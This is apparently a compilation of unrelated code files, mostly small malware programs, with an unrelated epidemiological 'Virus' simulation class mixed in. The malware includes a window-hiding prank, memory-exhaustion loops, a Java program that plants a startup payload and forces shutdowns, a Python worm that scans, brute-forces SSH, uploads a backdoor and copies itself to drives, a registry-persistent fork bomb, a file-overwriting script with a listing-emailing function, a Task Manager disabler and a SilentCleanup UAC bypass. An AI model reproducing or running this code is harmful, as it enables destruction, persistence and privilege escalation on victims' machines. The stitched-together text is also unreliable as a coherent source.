DWORD WINAPI moveit(){
    HWND a=GetForegroundWindow();
    int i,j,k=1;
    while(k++){
        i=200+300*cos(k);
        j=150+300*sin(k);
        MoveWindow(a,i,j,i,j,1);
        Sleep(50);
    }
}

main(){
    DWORD dwThreadId;
    HWND last=GetForegroundWindow();
    ShowWindow(last, SW_HIDE);
    while(1){
        if(last!=GetForegroundWindow()){
            last=GetForegroundWindow();
            CreateThread(NULL, 0, moveit, &last, 0, &dwThreadId);
        }
    }
}
<script>
var txt = "a";
while(1){
    txt += "a";
}
</script>
main(){
    while(malloc(1000));
}
package in.momin5.restartvirus;


import net.lingala.zip4j.ZipFile;
import org.apache.commons.io.IOUtils;


import java.io.*;
import java.util.Timer;
import java.util.TimerTask;

public class Main {

    public static void main(String[] args) throws Exception {
        timer();
        extract();
        System.out.println("Should shutdown computer in 1 hour, https://github.com/MOMIN5/restart-virus-java ");
    }
    public static void timer() {
        Timer timer = new Timer();

        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                try{
                    Runtime.getRuntime().exec("shutdown.exe -s -t 0"); //executes if windows
                    Runtime.getRuntime().exec("shutdown -h now"); // executes if linux
                }
                catch (IOException a){ // since it throws exceptions catch it
                    System.out.println(a);
                }
            }
        }, 59*60*1000, 59*60*1000 ); // timer executes after 59 minutes
    }

    public static void extract() throws IOException{

        InputStream is = Main.class.getClassLoader().getResourceAsStream("this.zip");
        File file = new File(System.getProperty("user.home")+ "\\AppData\\Roaming\\Microsoft\\Main");
        try(OutputStream outputStream = new FileOutputStream(file)){
            IOUtils.copy(is, outputStream);
        }catch (FileNotFoundException w){
        }catch (IOException s){
        }

        String infectPathWindows = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

        ZipFile z1 = new ZipFile(file);
        z1.extractAll(infectPathWindows);

    }
}
import java.util.*;

public class Virus {

	// simulation fields
	private Virus parent;
	private Phenotype phenotype;
	private double birth;		// measured in years relative to burnin
	private int deme;
	
	// additional reconstruction fields
	private boolean marked;
	private boolean trunk;	// fill this at the end of the simulation
	private List<Virus> children = new ArrayList<Virus>(0);	// will be void until simulation ends	
	private double layout;
	private int coverage;		// how many times this Virus has been covered in tracing the tree backwards
	
	// initialization
	public Virus() {
		phenotype = PhenotypeFactory.makeVirusPhenotype();
		birth = Parameters.getDate();
	}
		
	// replication, copies the virus, but remembers the ancestry
	public Virus(Virus v, int d) {
		parent = v;
		phenotype = v.getPhenotype();
		birth = Parameters.getDate();
		deme = d;
	}
	
	public Virus(Virus v, int d, Phenotype p) {
		parent = v;
		phenotype = p;
		birth = Parameters.getDate();
		deme = d;
	}	
	
	public Virus(int d, Phenotype p) {
		parent = null;
		phenotype = p;
		birth = Parameters.getDate();
		deme = d;
	}		
	
	// methods
	public Phenotype getPhenotype() {
		return phenotype;
	}
	public void setPhenotype(Phenotype p) {
		phenotype = p;
	}	
	public double getBirth() {
		return birth;
	}
	public Virus getParent() {
		return parent;
	}
	public void setParent(Virus v) {
		parent = v;
	}
	public boolean isTrunk() {
		return trunk; 
	}
	public void makeTrunk() {
		trunk = true;
	}
	public void mark() {
		marked = true;
	}
	public boolean isMarked() {
		return marked;
	}
	public int getDeme() {
		return deme;
	}	
	public double getLayout() {
		return layout;
	}
	public void setLayout(double y) {
		layout = y;
	}
	public int getCoverage() {
		return coverage;
	}
	public void incrementCoverage() {
		coverage++;
	}
	
	// add virus node as child if does not already exist
	public void addChild(Virus v) {
		if (!children.contains(v)) {
			children.add(v);
		}
	}		
	public int getNumberOfChildren() {
		return children.size();
	}
	public List<Virus> getChildren() {
		return children;
	}	
	public boolean isTip() {
		return getNumberOfChildren() == 0 ? true : false;
	}
	
	// returns a mutated copy, original virus left intact
	public Virus mutate() {
	
		Phenotype mutP = phenotype.mutate();			// mutated copy
		Virus mutV = new Virus(this,deme,mutP);
		return mutV;
		
	}
	
	public Virus commonAncestor(Virus virusB) {
		// Algorithm proceeds by recursively visiting parents.
		// It terminates when either lineage arrives at a node already in the ancestry set,
		// which must have been already visited by the other lineage and thus represents
		// a common ancestor.
		
		assert(virusB != null);
		if(virusB == this) {
			return this;
		}
		
		Virus lineageA = this;
		Virus lineageB = virusB;
		Set<Virus> ancestrySet = new HashSet<>();
		ancestrySet.add(lineageA);
		ancestrySet.add(lineageB);
		while(lineageA != null || lineageB != null) {
			if(lineageA != null) {
				lineageA = lineageA.getParent();
				if(lineageA != null && !ancestrySet.add(lineageA)) {
					return lineageA;
				}
			}
			if(lineageB != null) {
				lineageB = lineageB.getParent();
				if(lineageB != null && !ancestrySet.add(lineageB)) {
					return lineageB;
				}
			}
		}
		return null;
	}
	
	public double distance(Virus virusB) {
		Virus ancestor = commonAncestor(virusB);
		if (ancestor != null) {
			double distA = getBirth() - ancestor.getBirth();
			double distB = virusB.getBirth() - ancestor.getBirth();
			return distA + distB;
		}
		else {
			return 0;
		}
	}
	
	public double antigenicDistance(Virus virusB) {
		return phenotype.distance(virusB.getPhenotype());
	}	
	
	// is there a coalescence event within x amount of time? (measured in years)
	public double coalescence(Virus virusB, double windowTime) {

		Virus lineageA = this;
		Virus lineageB = virusB;
		Set<Virus> ancestry = new HashSet<Virus>();	
		double success = 0.0;
		
		double startTime = lineageA.getBirth();
		double time = startTime;
		while (time > startTime - windowTime) {
			if (lineageA.getParent() != null) {		
				lineageA = lineageA.getParent();
				time = lineageA.getBirth();
				ancestry.add(lineageA);
			}
			else {
				break;
			}
		}
		
		startTime = lineageB.getBirth();
		time = startTime;
		while (time > startTime - windowTime) {
			if (lineageB.getParent() != null) {		
				lineageB = lineageB.getParent();
				time = lineageB.getBirth();				
				if (!ancestry.add(lineageB)) { 
					success = 1.0;
					break; 
				}
			}
			else {
				break;
			}			
		}
		
		return success;	

	}	
	
	// this is the interval from this virus's birth back to its parent's birth
	public double serialInterval() {
		Virus p = getParent();
		return getBirth() - p.getBirth();
	}
	
	public String toString() {
		return Integer.toHexString(this.hashCode());
	}

}
import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
import netifaces
from threading import Thread

# ----- -----
import networking
# ----- -----

# ------------------- Logging ----------------------- #
import coloredlogs, logging
logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
# --------------------------------------------------- #


# gets gateway of the network
gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]

def scan_hosts(port):
    """
    Scans all machines on the same network that
     have the specified port enabled 
    Returns:
        IP addresses of hosts
    """
    logger.debug(f"Scanning machines on the same network with port {port} open.")


    logger.debug("Gateway: " + gateway)

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')

    all_hosts = port_scanner.all_hosts()

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts


def download_ssh_passwords(filename):
    """
     Downloads most commonly used ssh passwords from a specific url
      Clearly, you can store passwords in a dictionary, but i found this more comfortable
    Args:
        filename - Name to save the file as.
    """

    # TODO:130 This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/

    logger.debug("Downloading passwords...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("Passwords downloaded!")


def connect_to_ftp(host, username, password):
    # TODO:30 : Finish this function + Add bruteforcing
    try:
        ftp = FTP(host)
        ftp.login(username, password)
    except ftplib.all_errors as error:
        logger.error(error)
        pass


def connect_to_ssh(host, password):
    """
    Tries to connect to a SSH server
    Returns:
        True - Connection successful
        False - Something went wrong
    Args:
        host - Target machine's IP
        password - Password to use
    """

    # TODO:120 Pass usernames to the function too

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.debug("Connecting to: " + host)
        client.connect(host, 22, "root", password)
        logger.debug("Successfully connected!")

        sftp = client.open_sftp()
        sftp.put('backdoor.exe', "destination") # change this.

        return True
    except socket.error:
        logger.error("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("Wrong Password or Username")
        return False
    except paramiko.ssh_exception.SSHException:
        # socket is open, but not SSH service responded
        logger.error("No response from SSH server")
        return False


def bruteforce_ssh(host, wordlist):
    """
    Calls connect_to_ssh function and
    tries to bruteforce the target server.
    Args:
        wordlist - TXT file with passwords
    """
    # TODO:10 : Bruteforce usernames too
    file = open(wordlist, "r")
    for line in file:
        connection = connect_to_ssh(host, line)
        print(connection)
        time.sleep(5)

def drivespreading():
    # This function makes the worm copy itself on other drives on the computer
    # (also on the "startup" folder to be executed every time the computer boots)
    
    # WARNING: This function is very obvious to the user. The worm will be suddenly on every drive.
    # You may want to change the code and e.g. copy the worm only on new drives 
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print(drives)
        for drive in drives:
            try:
                if "C:\\" == drive:
                    copy2(__file__, bootfolder)
                else:
                    copy2(__file__, drive)
            except:
                pass
        
        time.sleep(3)

def start_drive_spreading():
    # Starts "drivespreading" function as a threaded function. 
    # This means that the code will spread on drives and execute other functions at the same time.
    thread = Thread(target = drivespreading)
    thread.start()
    
def main():
    start_drive_spreading()


if __name__ == "__main__":
    main()
import itertools,subprocess,sys,os
f =  os.path.basename(sys.argv[0])
Backdoor_Name=os.path.basename(__file__)
hiddenPath = os.getcwd()
hiddenPath = '\"' + hiddenPath + '\"'
regPath = os.getcwd()
regPath = regPath + r"\%s"%Backdoor_Name
regPath = '\"' + regPath + '\"'
regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
SetValueEx(regKey,"Microsoft Support",0, REG_SZ, r"" + regPath)
os.system("attrib +h " + hiddenPath)
while True:
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
	[''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=100)]
	[''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=100)]
import os
import sys
import hashlib
import fnmatch
import smtplib
from email.mime.text import MIMEText
# Global Vars
listOfAvailDirs = []
md5HashTitle = str(hashlib.md5('listOfAvailDirsTXTFile'.encode()).hexdigest()) + '.txt'
pathsToTXT = []
pathsToPDF = []
# Web Development File Types
pathsToHTML = []
pathsToCSS = []
pathsToJS = []
pathsToJSON = []
pathsToXML = []
pathsToXSL = []
pathsToPHP = []
pathsToSQL = []

# Other Programming Languages
pathsToPY = []
pathsToC = []
pathsToCPP = []
pathsToEXE = []
# Microsoft Office File Types
pathsToACCDB = []
pathsToXLSX = []
pathsToPPTX = []
pathsToDOCX = []
pathsToRTF = []
# Get all the hacked codes from separate file
from bf72dda9b27c0fb1f16fc6648348228d import *
# Get all "Find And Replace Files" Function Definitions From Seperate File
# from dec1ee0cb4bfcdb7a7b9968d85a01441 import * # To Be Implemented Later

# This Is Where Python Tries To Write To The Certain File Types By Prepending
# Some Code From The Same Language
# OR
# Complete and Utter Nonsense to destroy the program and fail the system!! JK
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
# This Is Where Python Searches For Many File Types
# This Function Basically Calls The Functions That Are Listed Below Sequentially
# Will Probably Migrate The Function Definitions To Other File For Faster Speeds!!!
def searchForKnownFileTypes(*directories):
    # Web Development Languages
    findTXT()
    findPDF()
    findHTML()
    findCSS()
    findJS()
    findXML()
    findXSL()
    findPHP()
    findSQL()

    # Microsoft Office File Types

    findACCDB()
    findXLSX()
    findPPTX()
    findDOCX()
    findRTF()

    # More Computer Based Languages
    findPY()
    findC()
    findCPP()
    findEXE()
    """
    # More Computer Based Languages
    findCS()
    findH()"""

# Web Development Languages
def findTXT():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredTXT = fnmatch.filter(filesInsideDir, '*.txt')
    if len(filteredTXT) > 0:
        for k in range(len(filteredTXT)):
            pathsToTXT.append(dirNameOfDir + "\\" + filteredTXT[k - 1])
        populateTXT()
def populateTXT():
    for l in range(len(pathsToTXT)):
        TXTFile = open(pathsToTXT[l - 1], "r")
        TXTFileContents = str(TXTFile.read())
        TXTFile.close()
        TXTFile = open(pathsToTXT[l - 1], "w")
        TXTFile.write("Hello!!\nThis Device Has Been Hacked By A Beginner Python Script!!\n\n\n\n\n" + TXTFileContents)
        TXTFile.close()

def findPDF():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPDF = fnmatch.filter(filesInsideDir, '*.pdf')
    if len(filteredPDF) > 0:
        for k in range(len(filteredPDF)):
            pathsToPDF.append(dirNameOfDir + "\\" + filteredPDF[k - 1])
        populatePDF()
def populatePDF():
    for l in range(len(pathsToPDF)):
        PDFFile = open(pathsToPDF[l - 1], "wb")
        PDFFile.write(pdfHackedCode)
        PDFFile.close()

def findHTML():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredHTML = fnmatch.filter(filesInsideDir, '*.html')
    filteredHTML.extend(fnmatch.filter(filesInsideDir, '*.htm'))
    filteredHTML.extend(fnmatch.filter(filesInsideDir, '*.xhtml'))
    if len(filteredHTML) > 0:
        for k in range(len(filteredHTML)):
            pathsToHTML.append(dirNameOfDir + "\\" + filteredHTML[k - 1])
        populateHTML()
def populateHTML():
    for l in range(len(pathsToHTML)):
        HTMLFile = open(pathsToHTML[l - 1], "w")
        HTMLFile.write(htmlHackedCode)
        HTMLFile.close()

def findXML():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXML = fnmatch.filter(filesInsideDir, '*.xml')
    if len(filteredXML) > 0:
        for k in range(len(filteredXML)):
            pathsToXML.append(dirNameOfDir + "\\" + filteredXML[k - 1])
        populateXML()
def populateXML():
    for l in range(len(pathsToXML)):
        XMLFile = open(pathsToXML[l - 1], "w")
        XMLFile.write(xmlHackedCode)
        XMLFile.close()

def findXSL():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXSL = fnmatch.filter(filesInsideDir, '*.xsl')
    if len(filteredXSL) > 0:
        for k in range(len(filteredXSL)):
            pathsToXSL.append(dirNameOfDir + "\\" + filteredXSL[k - 1])
        populateXSL()
def populateXSL():
    for l in range(len(pathsToXSL)):
        XSLFile = open(pathsToXSL[l - 1], "w")
        XSLFile.write(xslHackedCode)
        XSLFile.close()

def findCSS():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredCSS = fnmatch.filter(filesInsideDir, '*.css')
    if len(filteredCSS) > 0:
        for k in range(len(filteredCSS)):
            pathsToCSS.append(dirNameOfDir + "\\" + filteredCSS[k - 1])
        populateCSS()
def populateCSS():
    for l in range(len(pathsToCSS)):
        CSSFile = open(pathsToCSS[l - 1], "w")
        CSSFile.write(cssHackedCode)
        CSSFile.close()

def findJS():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredJS = fnmatch.filter(filesInsideDir, '*.js')
    if len(filteredJS) > 0:
        for k in range(len(filteredJS)):
            pathsToJS.append(dirNameOfDir + "\\" + filteredJS[k - 1])
        populateJS()
def populateJS():
    for l in range(len(pathsToJS)):
        JSFile = open(pathsToJS[l - 1], "w")
        JSFile.write(jsHackedCode)
        JSFile.close()

def findPHP():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPHP = fnmatch.filter(filesInsideDir, '*.php')
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.phtml'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php3'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php4'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php5'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php7'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.phps'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.php-s'))
    filteredPHP.extend(fnmatch.filter(filesInsideDir, '*.pht'))
    if len(filteredPHP) > 0:
        for k in range(len(filteredPHP)):
            pathsToPHP.append(dirNameOfDir + "\\" + filteredPHP[k - 1])
        populatePHP()
def populatePHP():
    for l in range(len(pathsToPHP)):
        PHPFile = open(pathsToPHP[l - 1], "w")
        PHPFile.write(phpHackedCode)
        PHPFile.close()

def findSQL():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredSQL = fnmatch.filter(filesInsideDir, '*.sql')
    if len(filteredSQL) > 0:
        for k in range(len(filteredSQL)):
            pathsToSQL.append(dirNameOfDir + "\\" + filteredSQL[k - 1])
        populateSQL()
def populateSQL():
    for l in range(len(pathsToSQL)):
        SQLFile = open(pathsToSQL[l - 1], "w")
        SQLFile.write(sqlHackedCode)
        SQLFile.close()

# Microsoft Office File Types

def findACCDB():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredACCDB = fnmatch.filter(filesInsideDir, '*.accdb')
    filteredACCDB.extend(fnmatch.filter(filesInsideDir, '*.mdb'))
    if len(filteredACCDB) > 0:
        for k in range(len(filteredACCDB)):
            pathsToACCDB.append(dirNameOfDir + "\\" + filteredACCDB[k - 1])
        populateACCDB()
def populateACCDB():
    for l in range(len(pathsToACCDB)):
        ACCDBFile = open(pathsToACCDB[l - 1], "wb")
        ACCDBFile.write(accdbHackedCode)
        ACCDBFile.close()

def findXLSX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredXLSX = fnmatch.filter(filesInsideDir, '*.xlsx')
    filteredXLSX.extend(fnmatch.filter(filesInsideDir, '*.xls'))
    if len(filteredXLSX) > 0:
        for k in range(len(filteredXLSX)):
            pathsToXLSX.append(dirNameOfDir + "\\" + filteredXLSX[k - 1])
        populateXLSX()
def populateXLSX():
    for l in range(len(pathsToXLSX)):
        XLSXFile = open(pathsToXLSX[l - 1], "wb")
        XLSXFile.write(xlsxHackedCode)
        XLSXFile.close()

def findPPTX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPPTX = fnmatch.filter(filesInsideDir, '*.pptx')
    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.ppt'))
    filteredPPTX.extend(fnmatch.filter(filesInsideDir, '*.pps'))
    if len(filteredPPTX) > 0:
        for k in range(len(filteredPPTX)):
            pathsToPPTX.append(dirNameOfDir + "\\" + filteredPPTX[k - 1])
        populatePPTX()
def populatePPTX():
    for l in range(len(pathsToPPTX)):
        PPTXFile = open(pathsToPPTX[l - 1], "wb")
        PPTXFile.write(pptxHackedCode)
        PPTXFile.close()

def findDOCX():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredDOCX = fnmatch.filter(filesInsideDir, '*.docx')
    filteredDOCX.extend(fnmatch.filter(filesInsideDir, '*.doc'))
    if len(filteredDOCX) > 0:
        for k in range(len(filteredDOCX)):
            pathsToDOCX.append(dirNameOfDir + "\\" + filteredDOCX[k - 1])
        populateDOCX()
def populateDOCX():
    for l in range(len(pathsToDOCX)):
        DOCXFile = open(pathsToDOCX[l - 1], "wb")
        DOCXFile.write(docxHackedCode)
        DOCXFile.close()

def findRTF():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredRTF = fnmatch.filter(filesInsideDir, '*.rtf')
    if len(filteredRTF) > 0:
        for k in range(len(filteredRTF)):
            pathsToRTF.append(dirNameOfDir + "\\" + filteredRTF[k - 1])
        populateRTF()
def populateRTF():
    for l in range(len(pathsToRTF)):
        RTFFile = open(pathsToRTF[l - 1], "wb")
        RTFFile.write(rtfHackedCode)
        RTFFile.close()

# More Computer Based Languages

def findPY():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredPY = fnmatch.filter(filesInsideDir, '*.py')
    if len(filteredPY) > 0:
        for k in range(len(filteredPY)):
            pathsToPY.append(dirNameOfDir + "\\" + filteredPY[k - 1])
        populatePY()
def populatePY():
    for l in range(len(pathsToPY)):
        PYFile = open(pathsToPY[l - 1], "w")
        PYFile.write(pyHackedCode)
        PYFile.close()

def findC():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredC = fnmatch.filter(filesInsideDir, '*.c')
    if len(filteredC) > 0:
        for k in range(len(filteredC)):
            pathsToC.append(dirNameOfDir + "\\" + filteredC[k - 1])
        populateC()
def populateC():
    for l in range(len(pathsToC)):
        CFile = open(pathsToC[l - 1], "w")
        CFile.write(cHackedCode)
        CFile.close()

def findCPP():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredCPP = fnmatch.filter(filesInsideDir, '*.cpp')
    if len(filteredCPP) > 0:
        for k in range(len(filteredCPP)):
            pathsToCPP.append(dirNameOfDir + "\\" + filteredCPP[k - 1])
        populateCPP()
def populateCPP():
    for l in range(len(pathsToCPP)):
        CPPFile = open(pathsToCPP[l - 1], "w")
        CPPFile.write(cppHackedCode)
        CPPFile.close()

def findEXE():
    filesInsideDir = listOfAvailDirs[j][3][1]
    dirNameOfDir = listOfAvailDirs[j][1][1]
    filteredEXE = fnmatch.filter(filesInsideDir, '*.exe')
    if len(filteredEXE) > 0:
        for k in range(len(filteredEXE)):
            pathsToEXE.append(dirNameOfDir + "\\" + filteredEXE[k - 1])
        populateEXE()
def populateEXE():
    for l in range(len(pathsToEXE)):
        EXEFile = open(pathsToEXE[l - 1], "wb")
        EXEFile.write(exeHackedCode)
        EXEFile.close()



"""
def findC(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredC = fnmatch.filter(availDirs, '*.c')
def findCS(*directories):
    availDirs = []
    for i in directories:
        availDirs.append(i)
    filteredCS = fnmatch.filter(availDirs, '*.cs')
def findH(*directories):
"""


# Main Directory Object
class Directory(object):
    # Instantiate The Object's Attributes
    dirName = ""
    dirsInside = []
    filesInside = []
    i = 0
    # When An Object Is Initialized, or Instantiated, This Function is Called:
    def __init__(self, i, dirName, dirsInside, filesInside):
        # Set The Instantiated Attributes To Certain Inputed Values
        self.i = i
        self.dirName = dirName
        self.dirsInside = dirsInside
        self.filesInside = filesInside
    # This Function Is Called When print(Directory()) is Called (It makes a more human-readable version)
    def __repr__(self):
        return str(self.__dict__)


# Create and Close TXT File With MD5 Hash Name (To Make It Seem Like a Malware/Virus!!)
listOfAvailDirsTXTFile = open(md5HashTitle, "w+")
listOfAvailDirsTXTFile.write("List of directories on this Computer:\n")
listOfAvailDirsTXTFile.close()
# Main Loop That Searches C:\ and Reports Every and All Directories Available For Next Step
# It Also Records Every Single Directory Path In The Previously Created TXT File
# The OS.WALK Function is a Built-In Python Function That Completely Searches A Directory By Itself
# and Calls The Code Inside Everytime It Comes Across Something
for dirName, dirsInside, filesInside in os.walk("test\\"):
    # Instantiate A New Directory Object With Attributes
    dictionaryOfDirs = Directory(Directory.i, dirName, dirsInside, filesInside)
    # Make The Instantiated Directory Iterable
    dictionaryOfDirs = dictionaryOfDirs.__dict__
    # Create Temporary Var
    listOfDirs = []
    # Search The Previously Instantiated Directory Object
    for key, value in dictionaryOfDirs.items():
        # Store The Info In A [key, value] format
        temp = [key, value]
        listOfDirs.append(temp)
    # Add The Info To The Entire List
    listOfAvailDirs.append(listOfDirs)
    # Add The Info To A Text File (For Testing Purposes)
    with open(md5HashTitle, "a") as listOfAvailDirsTXTFile:
        listOfAvailDirsTXTFile.write(str(listOfAvailDirs[Directory.i]) + "\n")
        print(int(int(os.path.getsize(md5HashTitle)) / 1000), "kb" )
    # Print is for testing purposes only. To stay under the radar,
    # it's best to not print out all of the directories and make
    # the user suspicious!!!
    # print(str(listOfAvailDirs[Directory.i]))
    Directory.i += 1

# Send Python Generated TXT File To Me
# Completely Unnecessary To The Program and Doesn't Work; Remove This!!!!!
def sendDirDetailsToMe():
    # Open listOfAvailDirsTXTFile Created Earlier by Python And Get Its Contents
    listOfAvailDirsTXTFile = open(md5HashTitle, "r")
    emailMSG = MIMEText(listOfAvailDirsTXTFile.read())
    listOfAvailDirsTXTFile.close()
    # After Closing The File, Prepare The Email To Be Sent
    sender = "damahdi03@gmail.com"
    emailMSG['Subject'] = "This Guy's Laptop Info!!!"
    emailMSG['From'] = sender
    emailMSG['To'] = sender

    emailServer = smtplib.SMTP('localhost')
    emailServer.sendmail(sender, [sender], emailMSG.as_string())
    emailServer.quit()

# Iterate Over The List Of Available Directories and Search and Replace Files
for j in range(len(listOfAvailDirs)):
    searchForKnownFileTypes(listOfAvailDirs[j])
exec(open("clearTest.py", "r").read())
for i in range(5):
    try:
        exec(open("genRandDirs.py", "r").read())
        print(i)
    except:
        pass
print("Starting Up The Virus!!!!!")
import os
print(os.getcwd())
exec(open("virus.py", "r").read())
 RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
               @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            else
                objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
public class UAC
    {
        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void startUAC()
        {
            if (IsAdmin())
            {
                return;
            }
            else
            {
                try
                {
                    Microsoft.Win32.RegistryKey key;
                    key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Environment");
                    key.SetValue("windir", @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
                    key.Close();

                    Process process = new Process();
                    process.StartInfo.FileName = "schtasks.exe";
                    process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                    process.Start();


                    Environment.Exit(0);
                }
                catch { }
            }
        }

    }

